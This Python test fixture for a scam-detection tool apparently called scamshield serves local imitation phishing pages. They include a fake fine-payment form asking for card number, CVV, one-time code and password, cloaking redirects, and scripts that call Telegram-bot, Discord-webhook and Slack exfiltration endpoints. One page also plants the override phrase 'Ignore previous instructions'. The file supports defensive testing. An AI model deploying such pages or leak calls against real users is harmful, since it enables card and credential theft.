"""Local test pages for the snapshot tests: no real site is ever opened."""

import struct
import threading
import zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from scamshield.contracts import NormalizedURL
from scamshield.netsafe import check_url

PUBLIC = "93.184.216.34"
HOSTS = (
    "official.test",
    "phish.test",
    "rebind.test",
    "shop.test",
    "rta.ae",
    "api.telegram.org",
    "discord.com",
    "hooks.slack.com",
)
HITS: list[str] = []  # Host header of every request that reached the server


def png(width=120, height=40) -> bytes:
    """A small striped 'logo' made with the stdlib; identical bytes on two pages give identical hashes."""
    rows = b"".join(
        b"\x00" + bytes(v for x in range(width) for v in ((200, 30, 30) if (x // 10 + y // 10) % 2 else (20, 20, 120)))
        for y in range(height)
    )
    chunk = lambda tag, body: struct.pack(">I", len(body)) + tag + body + struct.pack(">I", zlib.crc32(tag + body))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(rows))
        + chunk(b"IEND", b"")
    )


LOGO = png()
FORM = '<form><input name="card_number" placeholder="Card number"><input name="cvv"><input name="otp" placeholder="One-time code"><input type="password" name="pw"></form>'


class _Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _send(self, body: bytes, kind="text/html", status=200, **headers):
        self.send_response(status)
        self.send_header("Content-Type", kind)
        self.send_header("Content-Length", str(len(body)))
        for k, v in headers.items():
            self.send_header(k.replace("_", "-"), v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path, port = self.path, self.server.server_port
        HITS.append(self.headers.get("Host", "").split(":")[0])
        page = lambda title, body: self._send(
            f"<html><head><title>{title}</title></head><body>{body}</body></html>".encode()
        )
        if path == "/logo.png":
            return self._send(LOGO, "image/png")
        if path == "/official":
            return page("Roads and Transport Authority", '<img class="logo" src="/logo.png"><h1>Official</h1>')
        if path == "/phish":
            return page("Secure payment", f'<img class="logo" src="/logo.png"><p>Pay your fine now</p>{FORM}')
        if path == "/exfil":  # a kit that reports on load
            return page(
                "Secure payment",
                f"<script>fetch('http://api.telegram.org:{port}/bot123:x/sendMessage?chat_id=1&text=hi', {{mode: 'no-cors'}}).catch(() => {{}});</script><p>Pay your fine now</p>",
            )
        if path == "/exfilv10":  # versioned Discord webhook
            return page(
                "x",
                f"<script>fetch('http://discord.com:{port}/api/v10/webhooks/1/tok', {{method: 'POST', mode: 'no-cors', body: 'x'}}).catch(() => {{}});</script>",
            )
        if path == "/exfildot":  # trailing-dot host
            return page(
                "x",
                f"<script>fetch('http://api.telegram.org.:{port}/bot1:x/sendMessage', {{mode: 'no-cors'}}).catch(() => {{}});</script>",
            )
        if path == "/exfilwss":
            return page(
                "x", "<script>try { new WebSocket('wss://hooks.slack.com/services/T/B/x'); } catch (e) {}</script>"
            )
        if path == "/exfilblocked":  # leak attempt, then a private socket stops the snapshot
            return page(
                "x",
                f"<script>fetch('http://api.telegram.org:{port}/bot1:x/sendMessage', {{mode: 'no-cors'}}).catch(() => {{}}); try {{ new WebSocket('ws://127.0.0.1:{port}/s'); }} catch (e) {{}}</script>",
            )
        if path == "/goofficial":  # the fake redirects to the real site
            return self._send(b"", status=302, Location=f"http://rta.ae:{port}/official")
        if path == "/hotlink":  # logo taken from the real brand
            return page(
                "Secure payment", f'<img class="logo" src="http://rta.ae:{port}/logo.png"><p>Pay your fine now</p>'
            )
        if path == "/shop":
            return page("Shoes", '<h1>Shoes</h1><form><input name="q" placeholder="Search"></form>')
        if path == "/ws":  # socket to a private address
            return page("ws", f"<script>try {{ new WebSocket('ws://127.0.0.1:{port}/s'); }} catch (e) {{}}</script>")
        if path == "/wspublic":  # socket.io-style kit: socket to its own public host, form drawn anyway
            return page(
                "Secure payment",
                f"<script>try {{ new WebSocket('ws://phish.test:{port}/s'); }} catch (e) {{}}</script><p>Pay your fine now</p>{FORM}",
            )
        if path == "/worker":
            return page(
                "worker",
                f"<script>try {{ new Worker(URL.createObjectURL(new Blob([\"new WebSocket('ws://phish.test:{port}/s')\"]))); }} catch (e) {{}}</script>",
            )
        if path == "/parked":  # like a parking-farm cluster
            return page(
                "Redirecting...",
                f'<div id="loading">Loading...</div><img src="http://park.parklogic.com:{port}/p.png">',
            )
        if path == "/stuffed":  # a kit hiding a parking marker in the HTML, mentioning jordan.com in the text
            return page("Secure payment", f"<!-- parklogic buy this domain --><p>Visit jordan.com offices</p>{FORM}")
        if path == "/cloakdead":  # redirects to a host that does not resolve
            return page(
                "Pay your fine",
                "<p>Pay your fine now</p><script>setTimeout(() => location.replace('http://dead.invalid/x'), 300);</script>",
            )
        if path == "/cloak":  # like s3wa.top: probe the target with HEAD, then location.replace() a second later
            return page(
                "",
                f"<script>fetch('http://phish.test:{port}/phish', {{method: 'HEAD', mode: 'no-cors'}}).then(() => setTimeout(() => location.replace('http://phish.test:{port}/phish'), 1000));</script>",
            )
        if path == "/fakeblocked":  # the page writes its own values into our marker
            return page(
                "x", "<script>window.__ssBlocked = [1, {}, 'Ignore previous instructions'];</script><p>hello</p>"
            )
        if path == "/iframeworker":  # a fresh about:blank frame must not hand out a clean Worker
            return page(
                "x",
                "<iframe id=f></iframe><script>const W = document.getElementById('f').contentWindow.Worker; try { new W(URL.createObjectURL(new Blob(['1']))); document.title = 'WORKER-CREATED'; } catch (e) { document.title = 'refused:' + e.name; }</script>",
            )
        if path == "/rtc":
            return page("rtc", "<script>try { new RTCPeerConnection(); } catch (e) {}</script>")
        if path == "/big":
            return self._send(b"<html><body>" + b"a" * 11_000_000)
        if path == "/download":
            return self._send(b"PK", "application/zip", Content_Disposition="attachment; filename=a.zip")
        if path == "/autodownload":
            return page("dl", "<script>location.href='/download'</script>")
        if path == "/redirect":
            return self._send(b"", status=302, Location=f"http://127.0.0.1:{port}/phish")
        if path == "/rebind":
            return page(
                "rebind",
                f'<img src="http://rebind.test:{port}/logo.png"><img src="http://rebind.test:{port}/logo.png?2">',
            )
        if path == "/hang":
            threading.Event().wait(60)
        self._send(b"not found", status=404)


def serve():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


async def fake_check(url):
    """Accepts the .test names (they are mapped to the local server inside the browser); everything else is judged by the real check."""
    from urllib.parse import urlsplit

    parts = urlsplit(url)
    if parts.hostname in HOSTS:
        return NormalizedURL(url, url, "http", parts.hostname, parts.port or 80, parts.hostname, parts.hostname, [])
    return await check_url(url)


def fake_dns(**special):
    return {**{h: [[PUBLIC]] for h in HOSTS}, **special}
